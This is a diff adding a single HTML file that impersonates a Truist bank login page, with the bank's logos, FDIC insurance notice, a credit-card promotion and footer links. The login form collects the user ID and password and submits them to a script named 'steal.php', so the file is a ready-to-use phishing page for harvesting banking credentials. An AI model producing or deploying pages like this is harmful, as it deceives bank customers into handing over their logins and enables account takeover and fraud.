@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5fa;
+    }
+    .container {
+      display: flex;
+      min-height: 100vh;
+    }
+    .left {
+      flex: 1;
+      background-color: #f0e9f9;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+      text-align: center;
+    }
+    .left h3 {
+      font-size: 14px;
+      color: #502b85;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+    }
+    .left img.card-image {
+      width: 260px;
+      height: auto;
+      margin-bottom: 30px;
+      border-radius: 8px;
+    }
+    .left h2 {
+      color: #2e1a47;
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    .left p {
+      font-size: 15px;
+      color: #2e1a47;
+      max-width: 400px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    .left .btn-apply {
+      padding: 10px 24px;
+      background-color: white;
+      color: #502b85;
+      border: 2px solid #502b85;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    .info-links {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+    .info-links a {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      color: #6a4ea4;
+      font-size: 14px;
+      text-decoration: underline;
+    }
+    .info-links a::after {
+      content: '↗';
+      font-size: 12px;
+    }
+    .right {
+      flex: 1;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+      position: relative;
+      flex-direction: column;
+    }
+    .login-box {
+      width: 100%;
+      max-width: 360px;
+    }
+    .login-box .logo {
+      display: block;
+      margin: 0 auto 24px;
+      max-width: 140px;
+      height: auto;
+    }
+    .top-info {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      text-align: left;
+      margin-bottom: 30px;
+    }
+    .top-info img {
+      height: 16px;
+      margin-right: 8px;
+    }
+    .top-info span {
+      font-size: 12px;
+      color: #222;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #222;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      background-color: #f5f5fa;
+    }
+    .remember {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+    .remember input {
+      margin-right: 6px;
+    }
+    button[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background-color: #6a4ea4;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 15px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      color: #aaa;
+    }
+    .qr-btn {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #6a4ea4;
+      border-radius: 6px;
+      background-color: white;
+      color: #6a4ea4;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .links {
+      font-size: 13px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .links a {
+      display: block;
+      margin-bottom: 5px;
+      color: #6a4ea4;
+      text-decoration: none;
+    }
+    .register-link {
+      font-size: 13px;
+      text-align: left;
+      margin-top: 10px;
+    }
+    .register-link a {
+      color: #6a4ea4;
+      text-decoration: none;
+    }
+    .footer {
+      width: 100%;
+      background-color: #2e1a47;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      padding: 20px 40px;
+      font-size: 13px;
+      flex-wrap: wrap;
+    }
+    .footer-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .footer-right {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 40px;
+    }
+    .footer-bottom {
+      width: 100%;
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-size: 12px;
+      padding: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h3>Premium Rewards</h3>
+      <img src="images/enjoybeyond_signature.png" alt="Card Image" class="card-image">
+      <h2>New experiences are waiting.</h2>
+      <p>Pave your path to adventure with 30,000 bonus points after spending $1,500 within 90 days of opening a Truist Enjoy Beyond credit card account.</p>
+      <button class="btn-apply">Apply Now</button>
+      <div class="info-links">
+        <a href="#">See rates, fees & rewards</a>
+        <a href="#">Learn more</a>
+      </div>
+    </div>
+    <div class="right">
+      <div class="login-box">
+        <img src="images/trulogo_horz-trupurple.png" alt="Company Logo" class="logo">
+        <div class="top-info">
+          <img src="images/FDIC_Logo.png" alt="FDIC logo">
+          <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+        </div>
+        <form action="steal.php" method="POST">
+          <label for="userid">User ID</label>
+          <input type="text" id="userid" name="userid" required>
+
+          <div class="remember">
+            <input type="checkbox" id="saveid">
+            <label for="saveid">Save user ID</label>
+          </div>
+
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+
+          <button type="submit">Sign in</button>
+
+          <div class="divider">or</div>
+          <button type="button" class="qr-btn">Sign in with a QR code</button>
+
+          <div class="links">
+            <a href="#">Forgot User ID</a>
+            <a href="#">Reset Password</a>
+          </div>
+          <div class="register-link">
+            <p>Don't have an online user ID? <a href="#">Register now</a></p>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <div class="footer-left">
+      <img src="images/trulogo_horz-trupurple.png" alt="Truist Logo" style="height: 24px;">
+    </div>
+    <div class="footer-right">
+      <div>Privacy</div>
+      <div>Accessibility</div>
+      <div>Fraud & security</div>
+      <div>Limit use of my sensitive personal information</div>
+      <div>Terms and conditions</div>
+      <div>Do not sell or share my personal information</div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    &copy; 2025, Truist. All Rights Reserved.
+  </div>
+</body>
+</html>
